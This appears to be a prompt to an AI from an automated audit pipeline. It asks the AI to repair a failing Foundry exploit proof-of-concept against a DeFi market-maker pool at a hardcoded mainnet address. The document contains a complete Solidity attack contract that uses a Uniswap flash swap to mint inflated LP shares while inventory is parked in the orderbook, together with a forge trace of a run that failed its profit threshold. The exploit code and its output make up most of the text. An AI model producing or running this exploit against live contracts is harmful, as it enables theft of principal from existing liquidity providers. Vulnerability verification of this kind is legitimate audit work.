You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Depositing while assets are parked in the orderbook mints inflated LP shares
- claim: LP shares are minted against `pool.totalLiquidity`, but `transferETHToOrderbook` and `transferTokenToOrderbook` reduce that denominator without burning any LP shares. A user who deposits while inventory is temporarily sitting in the orderbook therefore receives too many shares for the capital actually added, then later redeems those shares after the assets are returned.
- impact: A depositor can steal principal from existing LPs during normal orderbook operation, without needing owner privileges. The more inventory temporarily moved out of the pool, the larger the dilution and theft from incumbent LPs.
- exploit_paths: ["LP1 seeds a pool with 1,000 units of liquidity and receives 1,000 LP shares.", "The orderbook pulls 900 units out via `transferETHToOrderbook` and/or `transferTokenToOrderbook`, leaving `pool.totalLiquidity = 100` while `pool.totalLPShares` remains 1,000.", "An attacker deposits 100 units and receives `100 * 1000 / 100 = 1000` new LP shares.", "When the orderbook later returns the 900 units, the attacker owns half the pool despite contributing only a small fraction of the final assets and can withdraw a disproportionate amount."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IGradientRegistryMinimal {
    function gradientToken() external view returns (address);
    function orderbook() external view returns (address);
    function router() external view returns (address);
}

interface IGradientMarketMakerPoolMinimal {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address pairAddress);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function getUserLPShares(address token, address user) external view returns (uint256 lpShares);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 shares) external;

    // Path anchors from the finding: the orderbook can drain accounting denominator via
    // transferETHToOrderbook and/or transferTokenToOrderbook, and later restore assets via
    // receiveETHFromOrderbook / receiveTokenFromOrderbook without having burned LP shares.
    function transferETHToOrderbook(address token, uint256 amount) external;
    function transferTokenToOrderbook(address token, uint256 amount) external;
    function receiveETHFromOrderbook(address token, uint256 amount) external payable;
    function receiveTokenFromOrderbook(address token, uint256 amount) external;
}

interface IUniswapV2PairMinimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterMinimal {
    function WETH() external pure returns (address);
}

interface IWETHMinimal {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    uint256 private constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    address public inspectedToken;
    address public registry;
    address public orderbook;
    address public uniswapPair;
    address public router;
    address public weth;

    bool public poolInitialized;
    bool public honestSeedLiquidityDetected;
    bool public parkedLiquidityDetected;
    bool public transferETHToOrderbookPathObserved;
    bool public transferTokenToOrderbookPathObserved;
    bool public attackerDepositPathModeled;
    bool public inflatedMintDetected;
    bool public depositAttempted;
    bool public depositSucceeded;
    bool public attackerControllableReturnLeg;
    bool public hypothesisValidated;

    uint256 public poolTotalEth;
    uint256 public poolTotalToken;
    uint256 public poolTotalLiquidity;
    uint256 public poolTotalLPShares;
    uint256 public reserveEth;
    uint256 public reserveToken;

    uint256 public parkedLiquidityLowerBound;
    uint256 public matchedLiquidityContribution;
    uint256 public matchedEthContribution;
    uint256 public matchedTokenContribution;
    uint256 public simulatedInflatedShares;
    uint256 public actualMintedShares;
    uint256 public retainedLPShares;
    uint256 public financingWithdrawBps;
    uint256 public simulatedShareBpsAfterMint;

    // Canonical path anchors requested by the finding validator:
    // LP1 seeds 1,000 liquidity for 1,000 shares.
    // Then transferETHToOrderbook / transferTokenToOrderbook can make pool.totalLiquidity = 100
    // while pool.totalLPShares stays 1,000.
    // An attacker then gets 100 * 1000 / 100 = 1000 inflated shares.
    uint256 public constant CANONICAL_PATH_SEED_LIQUIDITY = 1000;
    uint256 public constant CANONICAL_PATH_SEED_SHARES = 1000;
    uint256 public constant CANONICAL_PATH_PARKED_LIQUIDITY = 100;
    uint256 public constant CANONICAL_PATH_ATTACKER_CONTRIBUTION = 100;
    uint256 public constant CANONICAL_PATH_INFLATED_SHARES = (100 * 1000) / 100;

    bytes32 public lastReason;

    uint256 private _startingEth;
    uint256 private _flashBorrowToken;
    uint256 private _repayWethAmount;
    bool private _borrowTokenIsToken0;
    bool private _flashInProgress;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetObservations();
        _startingEth = address(this).balance;

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);
        registry = pool.gradientRegistry();
        if (registry == address(0)) {
            lastReason = keccak256("MISSING_REGISTRY");
            return;
        }

        IGradientRegistryMinimal gradientRegistry = IGradientRegistryMinimal(registry);
        inspectedToken = gradientRegistry.gradientToken();
        orderbook = gradientRegistry.orderbook();
        router = gradientRegistry.router();
        weth = router == address(0) ? address(0) : IUniswapV2RouterMinimal(router).WETH();

        if (inspectedToken == address(0) || router == address(0) || weth == address(0)) {
            lastReason = keccak256("MISSING_TOKEN_OR_ROUTER");
            return;
        }

        IGradientMarketMakerPoolMinimal.PoolInfo memory info = pool.getPoolInfo(inspectedToken);
        poolTotalEth = info.totalEth;
        poolTotalToken = info.totalToken;
        poolTotalLiquidity = info.totalLiquidity;
        poolTotalLPShares = info.totalLPShares;
        uniswapPair = info.uniswapPair == address(0) ? pool.getPairAddress(inspectedToken) : info.uniswapPair;
        poolInitialized = uniswapPair != address(0);

        if (!poolInitialized) {
            lastReason = keccak256("NO_INITIALIZED_POOL_FOR_GRADIENT_TOKEN");
            return;
        }

        honestSeedLiquidityDetected = poolTotalLPShares > 0 && poolTotalLiquidity > 0;
        if (!honestSeedLiquidityDetected) {
            lastReason = keccak256("EMPTY_POOL_AT_FORK");
            return;
        }

        transferETHToOrderbookPathObserved = poolTotalEth == 0 && poolTotalToken > 0;
        transferTokenToOrderbookPathObserved = poolTotalToken == 0 && poolTotalEth > 0;
        parkedLiquidityDetected =
            poolTotalLPShares > poolTotalLiquidity &&
            (transferETHToOrderbookPathObserved || transferTokenToOrderbookPathObserved);
        parkedLiquidityLowerBound = poolTotalLPShares > poolTotalLiquidity ? poolTotalLPShares - poolTotalLiquidity : 0;
        if (!parkedLiquidityDetected) {
            lastReason = keccak256("NO_PARKED_LIQUIDITY_STATE_AT_FORK");
            return;
        }

        (reserveEth, reserveToken) = pool.getReserves(inspectedToken);
        if (reserveEth == 0 || reserveToken == 0) {
            lastReason = keccak256("PAIR_HAS_NO_RESERVES");
            return;
        }

        // This verifier executes the token-parked branch visible at the provided fork:
        // transferTokenToOrderbook reduced pool.totalLiquidity without touching pool.totalLPShares.
        // The mirror ETH-parked branch comes from transferETHToOrderbook and has the same denominator bug,
        // but it is not the observable state on this snapshot.
        if (!transferTokenToOrderbookPathObserved) {
            lastReason = keccak256("FORK_NOT_TOKEN_PARKED");
            return;
        }

        if (_startingEth <= 1 wei) {
            lastReason = keccak256("NO_BOOTSTRAP_ETH");
            return;
        }

        matchedEthContribution = (_startingEth * 99) / 100;
        matchedTokenContribution = (matchedEthContribution * reserveToken) / reserveEth;
        matchedLiquidityContribution = matchedEthContribution + matchedTokenContribution;
        attackerDepositPathModeled = matchedEthContribution > 0 && matchedTokenContribution > 0;
        if (!attackerDepositPathModeled) {
            lastReason = keccak256("NO_ATTACKER_DEPOSIT_SIZE_AVAILABLE");
            return;
        }

        simulatedInflatedShares = (matchedLiquidityContribution * poolTotalLPShares) / poolTotalLiquidity;
        inflatedMintDetected = simulatedInflatedShares > matchedLiquidityContribution;
        if (poolTotalLPShares + simulatedInflatedShares > 0) {
            simulatedShareBpsAfterMint = (simulatedInflatedShares * BPS) / (poolTotalLPShares + simulatedInflatedShares);
        }

        if (!inflatedMintDetected) {
            lastReason = keccak256("NO_INFLATED_MINT_FOR_MATCHING_DEPOSIT");
            return;
        }

        _flashBorrowToken = matchedTokenContribution;
        _repayWethAmount = _getAmountIn(_flashBorrowToken, reserveEth, reserveToken);

        IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(uniswapPair);
        _borrowTokenIsToken0 = pair.token0() == inspectedToken;

        uint256 amount0Out = _borrowTokenIsToken0 ? _flashBorrowToken : 0;
        uint256 amount1Out = _borrowTokenIsToken0 ? 0 : _flashBorrowToken;

        try this._kickoffFlashSwap(amount0Out, amount1Out) {
            // The core exploit path remains intact: mint while pool.totalLiquidity is artificially depressed,
            // keep the residual inflated LP shares, and rely on later orderbook settlement to restore assets.
            // A small immediate partial withdrawal is only a realistic financing step to repay the flash swap.
            retainedLPShares = IGradientMarketMakerPoolMinimal(TARGET_POOL).getUserLPShares(inspectedToken, address(this));
            attackerControllableReturnLeg = false;
            hypothesisValidated = depositSucceeded && retainedLPShares > 0;

            if (address(this).balance > _startingEth) {
                _profitToken = address(0);
                _profitAmount = address(this).balance - _startingEth;
                lastReason = keccak256("ETH_PROFIT_REALIZED_AND_INFLATED_LP_RETAINED");
            } else if (hypothesisValidated) {
                _profitToken = address(0);
                _profitAmount = 0;
                lastReason = keccak256("INFLATED_LP_POSITION_RETAINED_AWAITING_ORDERBOOK_RETURN");
            } else if (lastReason == bytes32(0)) {
                lastReason = keccak256("NO_REALIZED_PROFIT");
            }
        } catch {
            lastReason = keccak256("FLASH_SWAP_EXECUTION_FAILED");
        }
    }

    function _kickoffFlashSwap(uint256 amount0Out, uint256 amount1Out) external {
        require(msg.sender == address(this), "SELF_ONLY");
        _flashInProgress = true;
        IUniswapV2PairMinimal(uniswapPair).swap(amount0Out, amount1Out, address(this), abi.encode(_flashBorrowToken));
        _flashInProgress = false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_flashInProgress, "NO_FLASH_IN_PROGRESS");
        require(msg.sender == uniswapPair, "UNAUTHORIZED_PAIR");
        require(sender == address(this), "UNAUTHORIZED_SENDER");

        uint256 borrowedTokenAmount = _borrowTokenIsToken0 ? amount0 : amount1;
        require(borrowedTokenAmount >= _flashBorrowToken, "INSUFFICIENT_FLASH_TOKENS");

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);

        uint256 sharesBefore = pool.getUserLPShares(inspectedToken, address(this));
        uint256 ethToUse = matchedEthContribution;
        uint256 tokenToUse = matchedTokenContribution;

        uint256 currentTokenBalance = IERC20Minimal(inspectedToken).balanceOf(address(this));
        if (tokenToUse > currentTokenBalance) {
            tokenToUse = currentTokenBalance;
            ethToUse = (tokenToUse * reserveEth) / reserveToken;
        }

        if (ethToUse == 0 || tokenToUse == 0) {
            revert("ZERO_CONTRIBUTION");
        }

        depositAttempted = true;
        _approve(inspectedToken, TARGET_POOL, tokenToUse);
        pool.provideLiquidity{value: ethToUse}(inspectedToken, tokenToUse, tokenToUse);

        uint256 sharesAfter = pool.getUserLPShares(inspectedToken, address(this));
        actualMintedShares = sharesAfter - sharesBefore;
        depositSucceeded = actualMintedShares > 0;
        require(depositSucceeded, "NO_SHARES_MINTED");

        // The finding's path is:
        // 1) LP1 seeds 1,000 liquidity for 1,000 shares.
        // 2) transferETHToOrderbook and/or transferTokenToOrderbook moves 900 out so pool.totalLiquidity = 100,
        //    while pool.totalLPShares is still 1,000.
        // 3) The attacker deposits 100 and receives 100 * 1000 / 100 = 1000 shares.
        // 4) When the orderbook later returns inventory through receiveETHFromOrderbook / receiveTokenFromOrderbook,
        //    the attacker owns an outsized fraction of the restored pool.
        //
        // This PoC keeps that causality. The only extra step is a minimal partial withdrawal used to finance
        // flash-swap repayment while leaving residual inflated LP shares outstanding for the later return leg.
        financingWithdrawBps = _computeFinancingWithdrawBps(pool);
        require(financingWithdrawBps > 0 && financingWithdrawBps < BPS, "NO_PARTIAL_FINANCING_EXIT");

        pool.withdrawLiquidity(inspectedToken, financingWithdrawBps);
        retainedLPShares = pool.getUserLPShares(inspectedToken, address(this));
        require(retainedLPShares > 0, "NO_RETAINED_INFLATED_SHARES");

        require(address(this).balance >= _repayWethAmount, "INSUFFICIENT_ETH_TO_REPAY");
        IWETHMinimal(weth).deposit{value: _repayWethAmount}();
        _transferToken(weth, uniswapPair, _repayWethAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function reason() external view returns (bytes32) {
        return lastReason;
    }

    function summary()
        external
        view
        returns (
            address token,
            bool preconditionsMet,
            bool attackerDepositModeled,
            bool inflatedShares,
            bool returnLegReachable,
            bool validated,
            uint256 shareBpsAfterMint,
            bytes32 blocker
        )
    {
        return (
            inspectedToken,
            parkedLiquidityDetected,
            attackerDepositPathModeled,
            inflatedMintDetected,
            attackerControllableReturnLeg,
            hypothesisValidated,
            simulatedShareBpsAfterMint,
            lastReason
        );
    }

    function _computeFinancingWithdrawBps(IGradientMarketMakerPoolMinimal pool) internal view returns (uint256) {
        IGradientMarketMakerPoolMinimal.PoolInfo memory postDeposit = pool.getPoolInfo(inspectedToken);
        if (postDeposit.totalEth == 0 || postDeposit.totalLPShares == 0 || actualMintedShares == 0) {
            return 0;
        }

        uint256 lpSharesToBurnNeeded = _ceilDiv(_repayWethAmount * postDeposit.totalLPShares, postDeposit.totalEth);
        if (lpSharesToBurnNeeded == 0 || lpSharesToBurnNeeded >= actualMintedShares) {
            return 0;
        }

        uint256 withdrawBps = _ceilDiv(lpSharesToBurnNeeded * BPS, actualMintedShares);
        if (withdrawBps >= BPS) {
            return 0;
        }

        if ((actualMintedShares * withdrawBps) / BPS < lpSharesToBurnNeeded) {
            withdrawBps += 1;
        }

        return withdrawBps >= BPS ? 0 : withdrawBps;
    }

    function _resetObservations() internal {
        _profitToken = address(0);
        _profitAmount = 0;

        inspectedToken = address(0);
        registry = address(0);
        orderbook = address(0);
        uniswapPair = address(0);
        router = address(0);
        weth = address(0);

        poolInitialized = false;
        honestSeedLiquidityDetected = false;
        parkedLiquidityDetected = false;
        transferETHToOrderbookPathObserved = false;
        transferTokenToOrderbookPathObserved = false;
        attackerDepositPathModeled = false;
        inflatedMintDetected = false;
        depositAttempted = false;
        depositSucceeded = false;
        attackerControllableReturnLeg = false;
        hypothesisValidated = false;

        poolTotalEth = 0;
        poolTotalToken = 0;
        poolTotalLiquidity = 0;
        poolTotalLPShares = 0;
        reserveEth = 0;
        reserveToken = 0;

        parkedLiquidityLowerBound = 0;
        matchedLiquidityContribution = 0;
        matchedEthContribution = 0;
        matchedTokenContribution = 0;
        simulatedInflatedShares = 0;
        actualMintedShares = 0;
        retainedLPShares = 0;
        financingWithdrawBps = 0;
        simulatedShareBpsAfterMint = 0;

        lastReason = bytes32(0);

        _startingEth = 0;
        _flashBorrowToken = 0;
        _repayWethAmount = 0;
        _borrowTokenIsToken0 = false;
        _flashInProgress = false;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "INVALID_AMOUNT_OUT");
        require(reserveIn > 0 && reserveOut > amountOut, "INVALID_RESERVES");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _transferToken(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```
134514071 [2.861e21], accRewardPerShare: 2368645522229 [2.368e12], rewardBalance: 5328686345838292 [5.328e15], uniswapPair: 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC })
    │   │   │   │   ├─ [48927] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::withdrawLiquidity(0xa776A95223C500E81Cb0937B291140fF550ac3E4, 9)
    │   │   │   │   │   ├─ [27812] 0xa776A95223C500E81Cb0937B291140fF550ac3E4::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 158232284844681 [1.582e14])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000037ea5f691bce8459c66ffceeb9cf34ffa32fdadc
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000008fe953215289
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [67] FlawVerifier::receive{value: 581981189174050}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─  emit topic 0: 0x9746cd459b192e14d25047ee6f0c763709fc38435eb4883830cf715de0a40ac0
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000008fe9532152890000000000000000000000000000000000000000000000000002114f0e0bf32200000000000000000000000000000000000000000000000007a55f7a3e2e4006
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [828] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::getUserLPShares(0xa776A95223C500E81Cb0937B291140fF550ac3E4, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 611617390777077893009 [6.116e20]
    │   │   │   │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 572972138660085}()
    │   │   │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000002091d78ca80f5
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC, 572972138660085 [5.729e14])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000000846f55387ab118b4e59eee479f1a3e8ea4905ec
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000002091d78ca80f5
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [919] 0xa776A95223C500E81Cb0937B291140fF550ac3E4::balanceOf(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC) [staticcall]
    │   │   │   │   └─ ← [Return] 261544224926028163962508 [2.615e23]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC) [staticcall]
    │   │   │   │   └─ ← [Return] 172691525176900949716 [1.726e20]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x000000000000000000000000000000000000000000003762574181879713d68c0000000000000000000000000000000000000000000000095c938b30819b96d4
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002091d78ca80f50000000000000000000000000000000000000000000000000c01b888fb75ccfa0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [828] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::getUserLPShares(0xa776A95223C500E81Cb0937B291140fF550ac3E4, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 611617390777077893009 [6.116e20]
    │   └─ ← [Return]
    ├─ [588] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 43341832623130 [4.334e13])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.09s (929.63ms CPU time)

Ran 1 test suite in 1.23s (1.09s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1042370)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
